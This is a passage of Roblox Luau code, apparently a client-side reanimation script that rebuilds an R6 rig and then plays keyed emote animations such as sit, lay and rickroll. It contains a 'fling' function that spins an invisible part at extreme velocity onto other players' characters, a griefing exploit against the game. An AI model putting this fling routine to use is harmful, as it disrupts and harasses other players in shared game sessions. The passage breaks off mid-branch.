    			if v:IsA("BasePart") then
    				for i1, v1 in pairs(v:GetChildren()) do
    					if v1:IsA("Motor6D") then
    						v1.Part0 = nil
    					end
    				end
    			end
    		end
    		part.Archivable = true
    		for i, v in pairs(R6parts) do
    			local part = part:Clone()
    			part:ClearAllChildren()
    			part.Name = v.Name
    			part.Size = v.Size
    			part.CFrame = cfr
    			part.Anchored = false
    			part.Transparency = 1
    			part.CanCollide = false
    			for i1, v1 in pairs(v.R15) do
    				local R15part = gp(c, i1, "BasePart")
    				local att = gp(R15part, "att1_" .. i1, "Attachment")
    				if R15part then
    					local weld = Instance.new("Weld", R15part)
    					weld.Name = "Weld_" .. i1
    					weld.Part0 = part
    					weld.Part1 = R15part
    					weld.C0 = cf(0, v1, 0)
    					weld.C1 = cf(0, 0, 0)
    					R15part.Massless = true
    					R15part.Name = "R15_" .. i1
    					R15part.Parent = part
    					if att then
    						att.Parent = part
    						att.Position = v3(0, v1, 0)
    					end
    				end
    			end
    			part.Parent = c
    			R6parts[i] = part
    		end
    		local R6joints = {
    			neck = {
    				Parent = R6parts.torso,
    				Name = "Neck",
    				Part0 = R6parts.torso,
    				Part1 = R6parts.head,
    				C0 = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
    				C1 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
    			},
    			rootJoint = {
    				Parent = R6parts.root,
    				Name = "RootJoint" ,
    				Part0 = R6parts.root,
    				Part1 = R6parts.torso,
    				C0 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
    				C1 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
    			},
    			rightShoulder = {
    				Parent = R6parts.torso,
    				Name = "Right Shoulder",
    				Part0 = R6parts.torso,
    				Part1 = R6parts.rightArm,
    				C0 = cf(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
    				C1 = cf(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
    			},
    			leftShoulder = {
    				Parent = R6parts.torso,
    				Name = "Left Shoulder",
    				Part0 = R6parts.torso,
    				Part1 = R6parts.leftArm,
    				C0 = cf(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
    				C1 = cf(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    			},
    			rightHip = {
    				Parent = R6parts.torso,
    				Name = "Right Hip",
    				Part0 = R6parts.torso,
    				Part1 = R6parts.rightLeg,
    				C0 = cf(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
    				C1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
    			},
    			leftHip = {
    				Parent = R6parts.torso,
    				Name = "Left Hip" ,
    				Part0 = R6parts.torso,
    				Part1 = R6parts.leftLeg,
    				C0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
    				C1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
    			}
    		}
    		for i, v in pairs(R6joints) do
    			local joint = Instance.new("Motor6D")
    			for prop, val in pairs(v) do
    				joint[prop] = val
    			end
    			R6joints[i] = joint
    		end
    		if hum1 then
        		hum1.RigType = Enum.HumanoidRigType.R6
        		hum1.HipHeight = 0
    		end
    	end
    end
    
    local torso1 = torso
    torso = gp(c, "Torso", "BasePart") or ((not R15toR6) and gp(c, torso.Name, "BasePart"))
    if (typeof(hedafterneck) == "Instance") and head and torso and torso1 then
    	local conNeck = nil
    	local conTorso = nil
    	local contorso1 = nil
    	local aligns = {}
    	local function enableAligns()
    	    conNeck:Disconnect()
            conTorso:Disconnect()
            conTorso1:Disconnect()
    		for i, v in pairs(aligns) do
    			v.Enabled = true
    		end
    	end
    	conNeck = hedafterneck.Changed:Connect(function(prop)
    	    if table.find({"Part0", "Part1", "Parent"}, prop) then
    	        enableAligns()
    		end
    	end)
    	conTorso = torso:GetPropertyChangedSignal("Parent"):Connect(enableAligns)
    	conTorso1 = torso1:GetPropertyChangedSignal("Parent"):Connect(enableAligns)
    	for i, v in pairs(head:GetDescendants()) do
    		if v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
    			i = tostring(i)
    			aligns[i] = v
    			v:GetPropertyChangedSignal("Parent"):Connect(function()
    			    aligns[i] = nil
    			end)
    			v.Enabled = false
    		end
    	end
    end
    
    local flingpart0 = gp(model, flingpart, "BasePart") or gp(gp(model, flingpart, "Accessory"), "Handle", "BasePart")
    local flingpart1 = gp(c, flingpart, "BasePart") or gp(gp(c, flingpart, "Accessory"), "Handle", "BasePart")
    
    local fling = function() end
    if flingpart0 and flingpart1 then
        flingpart0:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (flingpart0 and flingpart0.Parent) then
                flingpart0 = nil
                fling = function() end
            end
        end)
        flingpart0.Archivable = true
        flingpart1:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (flingpart1 and flingpart1.Parent) then
                flingpart1 = nil
                fling = function() end
            end
        end)
        local att0 = gp(flingpart0, "att0_" .. flingpart0.Name, "Attachment")
        local att1 = gp(flingpart1, "att1_" .. flingpart1.Name, "Attachment")
        if att0 and att1 then
            att0:GetPropertyChangedSignal("Parent"):Connect(function()
                if not (att0 and att0.Parent) then
                    att0 = nil
                    fling = function() end
                end
            end)
            att1:GetPropertyChangedSignal("Parent"):Connect(function()
                if not (att1 and att1.Parent) then
                    att1 = nil
                    fling = function() end
                end
            end)
            local lastfling = nil
            local mouse = lp:GetMouse()
            fling = function(target, duration, rotVelocity)
                if typeof(target) == "Instance" then
                    if target:IsA("BasePart") then
                        target = target.Position
                    elseif target:IsA("Model") then
                        target = gp(target, "HumanoidRootPart", "BasePart") or gp(target, "Torso", "BasePart") or gp(target, "UpperTorso", "BasePart") or target:FindFirstChildWhichIsA("BasePart")
                        if target then
                            target = target.Position
                        else
                            return
                        end
                    elseif target:IsA("Humanoid") then
                        local parent = target.Parent
                        if not (parent and parent:IsA("Model")) then
                            return
                        end
                        target = gp(target, "HumanoidRootPart", "BasePart") or gp(target, "Torso", "BasePart") or gp(target, "UpperTorso", "BasePart") or target:FindFirstChildWhichIsA("BasePart")
                        if target then
                            target = target.Position
                        else
                            return
                        end
                    else
                        return
                    end
                elseif typeof(target) == "CFrame" then
                    target = target.Position
                elseif typeof(target) ~= "Vector3" then
                    target = mouse.Hit
                    if target then
                        target = target.Position
                    else
                        return
                    end
                end
                lastfling = target
                if type(duration) ~= "number" then
                    duration = tonumber(duration) or 0.5
                end
                if typeof(rotVelocity) ~= "Vector3" then
                    rotVelocity = v3(20000, 20000, 20000)
                end
                if not (target and flingpart0 and flingpart1 and att0 and att1) then
                    return
                end
                local flingpart = flingpart0:Clone()
                flingpart.Transparency = 1
                flingpart.Size = v3(0.01, 0.01, 0.01)
                flingpart.CanCollide = false
                flingpart.Name = "flingpart_" .. flingpart0.Name
                flingpart.Anchored = true
                flingpart.Velocity = v3_0
                flingpart.RotVelocity = v3_0
                flingpart:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not (flingpart and flingpart.Parent) then
                        flingpart = nil
                    end
                end)
                flingpart.Parent = flingpart1
                if flingpart0.Transparency > 0.5 then
                    flingpart0.Transparency = 0.5
                end
                att1.Parent = flingpart
                for i, v in pairs(att0:GetChildren()) do
                    if v:IsA("AlignOrientation") then
                        v.Enabled = false
                    end
                end
                local con = nil
                con = heartbeat:Connect(function()
                    if target and (lastfling == target) and flingpart and flingpart0 and flingpart1 and att0 and att1 then
                        flingpart0.RotVelocity = rotVelocity
                        flingpart.Position = target
                    else
                        con:Disconnect()
                    end
                end)
                local rsteppedRotVel = v3(
                    ((rotVelocity.X > 0) and -1) or 1,
                    ((rotVelocity.Y > 0) and -1) or 1,
                    ((rotVelocity.Z > 0) and -1) or 1
                )
                local con = nil
                con = renderstepped:Connect(function()
                    if target and (lastfling == target) and flingpart and flingpart0 and flingpart1 and att0 and att1 then
                        flingpart0.RotVelocity = rsteppedRotVel
                        flingpart.Position = target
                    else
                        con:Disconnect()
                    end
                end)
                wait(duration)
                if lastfling ~= target then
                    if flingpart then
                        if att1 and (att1.Parent == flingpart) then
                            att1.Parent = flingpart1
                        end
                        flingpart:Destroy()
                    end
                    return
                end
                target = nil
                if not (flingpart and flingpart0 and flingpart1 and att0 and att1) then
                    return
                end
                flingpart0.RotVelocity = v3_0
                att1.Parent = flingpart1
                for i, v in pairs(att0:GetChildren()) do
                    if v:IsA("AlignOrientation") then
                        v.Enabled = true
                    end
                end
                if flingpart then
                    flingpart:Destroy()
                end
            end
        end
    end
end

local c = game:GetService("Players").LocalPlayer.Character
if not c then return end
local ws = game:GetService("Workspace")
c.AncestryChanged:Connect(function()
    if not c:IsDescendantOf(ws) then
        c = nil
    end
end)
local rs = game:GetService("RunService")
local stepped, renderstepped, heartbeat = rs.Stepped, rs.RenderStepped, rs.Heartbeat
local function gp(parent, name, classname)
    if typeof(parent) == "Instance" then
        for i, v in pairs(parent:GetChildren()) do
            if (v.Name == name) and v:IsA(classname) then
                return v
            end
        end
    end
    return nil
end

local function joint(name, parent, Part0, Part1, fakejoint)
    fakejoint.C0 = CFrame.new()
    fakejoint.C1 = CFrame.new()
    local joint = gp(parent, name, "Motor6D")
    if joint then
        fakejoint.C0 = joint.C0
        fakejoint.C1 = joint.C1
    end
    local con = nil
    con = stepped:Connect(function()
        if not c then
            return con:Disconnect()
        end
        local fix = nil
        fix = function()
            if not joint then 
                joint = Instance.new("Motor6D")
                joint.Changed:Connect(fix)
                joint.Destroying:Connect(function() joint = nil end)
            end
            joint.Part0 = Part0
            joint.Part1 = Part1
            joint.C0 = fakejoint.C0
            joint.C1 = fakejoint.C1
            joint.Parent = parent
        end
        fix()
    end)
end

local function part(name)
    local part = gp(c, name, "BasePart")
    if not part then
        part = Instance.new("Part")
        part.Name = name
        part.Transparency = 1
        part.CanCollide = false
        part.Massless = true
        part.Size = Vector3.new(1, 1, 1)
        part.Parent = c
    end
    local size = part.Size
    part.Destroying:Connect(function()
        part = nil
        c = nil
    end)
    local con = nil
    con = stepped:Connect(function()
        if not part then
            return con:Disconnect()
        end
        part.Anchored = false
        part.Name = name
        part.Size = size
        part.CanQuery = false
        part.CanTouch = false
        part.Parent = c
    end)
    return part
end

local Torso = part("Torso")
local RightArm = part("Right Arm")
local LeftArm = part("Left Arm")
local LeftLeg = part("Left Leg")
local RightLeg = part("Right Leg")
local Head = part("Head")
local HumanoidRootPart = part("HumanoidRootPart")

local RootJoint = {}
local RightShoulder = {}
local LeftShoulder = {}
local RightHip = {}
local LeftHip = {}
local Neck = {}

joint("Neck", Torso, Torso, Head, Neck)
joint("RootJoint", HumanoidRootPart, HumanoidRootPart, Torso, RootJoint)
joint("Right Shoulder", Torso, Torso, RightArm, RightShoulder)
joint("Left Shoulder", Torso, Torso, LeftArm, LeftShoulder)
joint("Right Hip", Torso, Torso, RightLeg, RightHip)
joint("Left Hip", Torso, Torso, LeftLeg, LeftHip)

local animate = gp(c, "Animate", "LocalScript")
if animate then
    animate.Disabled = true
end

local hum = c:FindFirstChildOfClass("Humanoid") or Instance.new("Humanoid", c)
local states = {
    [0]=false,[8]=true,
    [10]=false,[12]=false,
    [11]=false,[1]=false,
    [2]=true,[3]=true,
    [7]=true,[6]=false,
    [5]=true,[13]=false,
    [14]=false,[15]=false,
    [4]=false,[16]=false
}
for i, v in pairs(states) do
    hum:SetStateEnabled(i, v)
end
for i, v in pairs(hum:GetPlayingAnimationTracks()) do
    v:Stop()
end
hum.RigType = Enum.HumanoidRigType.R6
hum.BreakJointsOnDeath = false
hum.RequiresNeck = false
hum.MaxHealth = 0
hum.Health = 0
hum:ChangeState(8)

local modes = {
    q = "lay",
    e = "sit",
    r = "rickroll",
    t = "wave",
    y = "dab",
    u = "dance",
    p = "T",
    f = "float",
    g = "floss",
    h = "emote",
    j = "pushups",
    k = "kazotsky",
    l = "L"
}
for i, v in pairs(modes) do
    if type(i) == "string" then
        modes[Enum.KeyCode[i:upper()]] = v
    end
end
local uis, mode = game:GetService("UserInputService"), ""
uis.InputBegan:Connect(function(key)
    if uis:GetFocusedTextBox() then return end
    key = key.KeyCode
    if mode == modes[key] then
        mode = ""
    else
        mode = modes[key] or mode
    end
end)

local cf, v3, euler, sin, sine, abs = CFrame.new, Vector3.new, CFrame.fromEulerAnglesXYZ, math.sin, 0, math.abs
local con = nil
con = renderstepped:Connect(function(deltaTime)
    if not c then
        return con:Disconnect()
    end
    local vel = HumanoidRootPart.Velocity
    sine += deltaTime
    deltaTime *= 10
    if vel.Magnitude > 2 then
        if abs(vel.X) + abs(vel.Z) > abs(vel.Y) then -- walk
            
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * euler(-0.6108652381980153 * sin(sine * 8), 1.5707963267948966 + 0.17453292519943295 * sin(sine * 8), 0), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.2 * sin(sine * 16), 0) * euler(-1.6580627893946132 + 0.04363323129985824 * sin(sine * 16), 0.03490658503988659 * sin(sine * 8), -3.141592653589793 - 0.08726646259971647 * sin((sine + 0.25) * 8)), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * euler(0.6108652381980153 * sin(sine * 8), -1.5707963267948966 + 0.17453292519943295 * sin(sine * 8), 0), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.1) * 16), -0.03490658503988659 * sin((sine + 0.05) * 8), -3.141592653589793 + 0.08726646259971647 * sin((sine + 0.25) * 8)), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.2 * sin((sine + 0.125) * 8), 0) * euler(1.5707963267948966 + 0.6981317007977318 * sin(sine * 8), 1.5707963267948966 + 0.08726646259971647 * sin(sine * 8), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.2 * sin((sine + 0.125) * 8), 0) * euler(1.5707963267948966 - 0.6981317007977318 * sin(sine * 8), -1.5707963267948966 + 0.08726646259971647 * sin(sine * 8), 1.5707963267948966), deltaTime) 
            --RightArm,1,0,0,8,0,-35,0,8,0.5,0,0,8,90,10,0,8,0,0,0,8,0,0,0,8,Torso,0,0,0,8,-95,2.5,0,16,0,0.2,0,16,0,2,0,8,0,0,0,8,-180,-5,0.25,8,Fedora_Handle,8.657480066176504e-09,0,0,8,-6,0,0,8,-0.15052366256713867,0,0,8,0,0,0,8,-0.010221302509307861,0,0,8,0,0,0,8,LeftArm,-1,0,0,8,-0,35,0,8,0.5,0,0,8,-90,10,0,8,0,0,0,8,0,0,0,8,Head,0,0,0,8,-90,-5,0.1,16,1,0,0,8,0,-2,0.05,8,0,0,0,8,-180,5,0.25,8,RightLeg,1,0,0,8,90,40,0,8,-1,0.2,0.125,8,90,5,0,8,0,0,0,8,-90,0,0,8,LeftLeg,-1,0,0,8,90,-40,0,8,-1,-0.2,0.125,8,-90,5,0,8,0,0,0,8,90,0,0,8
            
        elseif vel.Y > 0 then -- jump
            
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * euler(-1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.25) * 4), 0.08726646259971647 * sin(sine * 4), -3.141592653589793), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.3962634015954636 - 0.08726646259971647 * sin((sine + 0.5) * 4), -0.08726646259971647 * sin((sine + 0.25) * 4), -3.141592653589793), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * euler(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * euler(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime) 
            --Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Torso,0,0,0,4,-90,5,0.25,4,0,0,0,4,0,5,0,4,0,0,0,4,-180,0,0,4,Head,0,0,0,4,-80,-5,0.5,4,1,0,0,4,0,-5,0.25,4,0,0,0,4,-180,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,5,0.25,4,0,0,0,4,-90,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,-5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,5,0.25,4,0,0,0,4,90,0,0,4
            
        else -- fall
            
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * euler(-1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.25) * 4), 0.08726646259971647 * sin(sine * 4), -3.141592653589793), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.5) * 4), -0.08726646259971647 * sin((sine + 0.25) * 4), -3.141592653589793), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * euler(3.839724354387525 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * euler(1.7453292519943295, 1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * euler(3.839724354387525 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(1.7453292519943295, -1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime) 
            --Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Torso,0,0,0,4,-95,5,0.25,4,0,0,0,4,0,5,0,4,0,0,0,4,-180,0,0,4,Head,0,0,0,4,-100,-5,0.5,4,1,0,0,4,0,-5,0.25,4,0,0,0,4,-180,0,0,4,LeftArm,-1,0,0,4,220,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,RightLeg,1,0,0,4,100,0,0,4,-1,0,0,4,95,5,0.25,4,0,0,0,4,-90,0,0,4,RightArm,1,0,0,4,220,-5,0.5,4,0.5,0,0,4,100,-5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,100,0,0,4,-1,0,0,4,-95,5,0.25,4,0,0,0,4,90,0,0,4
            
        end
    else --idle
        
        if mode == "" then
            
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9999998807907104, 0.4999999403953552, -2.765073337516225e-32) * euler(-1.5707963267948966, 1.3962634015954636 + 0.08726646259971647 * sin((sine + 1) * 2), 1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 1.1739236345820182e-24 + 0.1 * sin((sine + 0.35) * 2), 0.1 * sin(sine * 2)) * euler(-1.5707963267948966 + 0.08726646259971647 * sin(sine * 2), 0.017453292519943295 * sin(sine * 2), -2.792526803190927), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9999998807907104, 0.4999999403953552, -1.2568507556530796e-32) * euler(1.5707963267948966, -1.3962634015954636 + 0.08726646259971647 * sin((sine + 1) * 2), 1.2217304763960306), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 + 0.08726646259971647 * sin((sine - 0.375) * 2), 0, 2.792526803190927 + 0.5235987755982988 * sin(sine * 0.6)), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(0.9999998807907104, -1.100000023841858 - 0.1 * sin((sine + 0.35) * 2), 0) * euler(-1.0471975511965976 - 0.08726646259971647 * sin(sine * 2), 1.3962634015954636, 1.3962634015954636), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1.100000023841858 - 0.1 * sin((sine + 0.35) * 2), 0) * euler(-1.7453292519943295 - 0.08726646259971647 * sin(sine * 2), -1.3962634015954636, -1.3962634015954636), deltaTime) 
            --RightArm,0.9999998807907104,0,0,2,-90,0,0,2,0.4999999403953552,0,0,2,80,5,1,2,-2.765073337516225e-32,0,0,2,90,0,0,2,Torso,0,0,0,2,-90,5,0,2,1.1739236345820182e-24,0.1,0.35,2,0,1,0,2,0,0.1,0,2,-160,0,0,2,Fedora_Handle,8.657480066176504e-09,0,0,2,-6,0,0,2,-0.15052366256713867,0,0,2,0,0,0,2,-0.010221302509307861,0,0,2,0,0,0,2,LeftArm,-0.9999998807907104,0,0,2,90,0,0,2,0.4999999403953552,0,0,2,-80,5,1,2,-1.2568507556530796e-32,0,0,2,70,0,0,2,Head,0,0,0,2,-90,5,-0.375,2,1,0,0,2,0,0,0,2,0,0,0,2,160,30,0,0.6,RightLeg,0.9999998807907104,0,0,2,-60,-5,0,2,-1.100000023841858,-0.1,0.35,2,80,0,0,2,0,0,0,2,80,0,0,2,LeftLeg,-1,0,0,2,-100,-5,0,2,-1.100000023841858,-0.1,0.35,2,-80,0,0,2,0,0,0,2,-80,0,0,2

        elseif mode == "lay" then
            
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -2.4 - 0.1 * sin(sine), 0) * euler(-0.04363323129985824 + 0.08726646259971647 * sin(sine), 0, -3.141592653589793), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1.25, -1.25, 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin(sine), 1.0471975511965976, -1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin(sine), -1.2217304763960306, 1.2217304763960306), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1 + 0.05 * sin(sine - 0.5), 0.7 + 0.05 * sin(sine), 0) * euler(1.5707963267948966 - 0.08726646259971647 * sin(sine + 1), -0.3490658503988659, 0.8726646259971648), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, -0.075 * sin(sine)) * euler(-1.5707963267948966 - 0.17453292519943295 * sin(sine), 0, -3.141592653589793), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.7 - 0.1 * sin(sine), 0.5, -0.2) * euler(1.3962634015954636, 1.0471975511965976 + 0.08726646259971647 * sin(sine + 0.5), -1.0471975511965976), deltaTime) 
            --Torso,0,0,0,1,-2.5,5,0,1,-2.4,-0.1,0,1,0,0,0,1,0,0,0,1,-180,0,0,1,RightLeg,1.25,0,0,1,90,-5,0,1,-1.25,0,0,1,60,0,0,1,0,0,0,1,-90,0,0,1,LeftLeg,-1,0,0,1,90,-5,0,1,-1,0,0,1,-70,0,0,1,0,0,0,1,70,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1,0.05,-0.5,1,90,-5,1,1,0.7,0.05,0,1,-20,0,0,1,0,0,0,1,50,0,0,1,Head,0,0,0,1,-90,-10,0,1,1,0,0,1,0,0,0,1,0,-0.075,0,1,-180,0,0,1,RightArm,0.7,-0.1,0,1,80,0,0,1,0.5,0,0,1,60,5,0.5,1,-0.2,0,0,1,-60,0,0,1

        elseif mode == "sit" then
            
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9 + 0.1 * sin(sine), 0.25 + 0.1 * sin(sine), 0) * euler(1.3089969389957472, -1.6580627893946132 - 0.08726646259971647 * sin(sine), 1.5707963267948966), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-0.7, 0.25, -0.7 - 0.3 * sin(sine)) * euler(1.5707963267948966 - 0.17453292519943295 * sin(sine), -1.7453292519943295, 1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -1.8 - 0.1 * sin(sine), 0) * euler(-1.3962634015954636, 0, -3.141592653589793), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.6580627893946132 + 0.17453292519943295 * sin(sine + 1.25), 0, -3.141592653589793 + 0.5235987755982988 * sin(sine * 0.25)), deltaTime) 
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.7, 0) * euler(2.9670597283903604 + 0.04363323129985824 * sin(sine), 1.6580627893946132, -1.5707963267948966), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9 - 0.1 * sin(sine), 0.25 + 0.1 * sin(sine), 0) * euler(1.3089969389957472, 1.6580627893946132 + 0.08726646259971647 * sin(sine), -1.5707963267948966), deltaTime) 
            --LeftArm,-0.9,0.1,0,1,75,0,0,1,0.25,0.1,0,1,-95,-5,0,1,0,0,0,1,90,0,0,1,LeftLeg,-0.7,0,0,1,90,-10,0,1,0.25,0,0,1,-100,0,0,1,-0.7,-0.3,0,1,90,0,0,1,Torso,0,0,0,1,-80,0,0,1,-1.8,-0.1,0,1,0,0,0,1,0,0,0,1,-180,0,0,1,Head,0,0,0,1,-95,10,1.25,1,1,0,0,1,0,0,0,1,0,0,0,1,-180,30,0,0.25,RightLeg,1,0,0,1,170,2.5,0,1,-0.7,0,0,1,95,0,0,1,0,0,0,1,-90,0,0,1,Fedora_Handle,8.657480066176504e-09,4,0,0.5,-6,0,0,1,-0.15052366256713867,0,0,0.5,0,360,0,0.5,-0.010221302509307861,0,0,1,0,0,0,1,RightArm,0.9,-0.1,0,1,75,0,0,1,0.25,0.1,0,1,95,5,0,1,0,0,0,1,-90,0,0,1

        elseif mode == "rickroll" then
            
            RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.9 - 0.2 * sin(sine * 2), 0) * euler(1.5707963267948966, 1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), -1.5707963267948966), deltaTime) 
            RootJoint.C0 = RootJoint.C0:Lerp(cf(0.3 * sin(sine + 0.8), -0.1 + 0.2 * sin(sine * 2), 0) * euler(-1.5707963267948966, 0, -3.141592653589793), deltaTime) 
            Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * euler(-1.5707963267948966 + 0.08726646259971647 * sin((sine - 0.5) * 2), 0.08726646259971647 * sin(sine - 1), -3.141592653589793 + 0.2617993877991494 * sin(sine * 5)), deltaTime) 
            LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1 + 0.1 * sin(sine * 7), 0.2 - 0.1 * sin(sine + 0.8), -0.25) * euler(1.5707963267948966 + 0.5235987755982988 * sin(sine * 7), -0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
            LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.9 - 0.2 * sin(sine * 2), 0) * euler(1.5707963267948966, -1.6580627893946132 - 0.17453292519943295 * sin(sine + 0.8), 1.5707963267948966), deltaTime) 
            RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1 + 0.1 * sin(sine * 7), 0.2 + 0.1 * sin(sine + 0.8), -0.25) * euler(1.5707963267948966 - 0.5235987755982988 * sin(sine * 7), 0.6981317007977318, 0.3490658503988659 * sin(sine * 7)), deltaTime) 
            --RightLeg,1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,95,-10,0.8,1,0,0,0,1,-90,0,0,1,Torso,0,0.3,0.8,1,-90,0,0,1,-0.1,0.2,0,2,0,0,0,1,0,0,0,1,-180,0,0,1,Head,0,0,0,1,-90,5,-0.5,2,1,0,0,1,0,5,-1,1,0,0,0,1,-180,15,0,5,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,LeftArm,-1,0.1,0,7,90,30,0,7,0.2,-0.1,0.8,1,-40,0,0,1,-0.25,0,0,1,0,20,0,7,LeftLeg,-1,0,0,1,90,0,0,1,-0.9,-0.2,0,2,-95,-10,0.8,1,0,0,0,1,90,0,0,1,RightArm,1,0.1,0,7,90,-30,0,7,0.2,0.1,0.8,1,40,0,0,1,-0.25,0,0,1,-0,20,0,7
            
        elseif mode == "wave" then
            
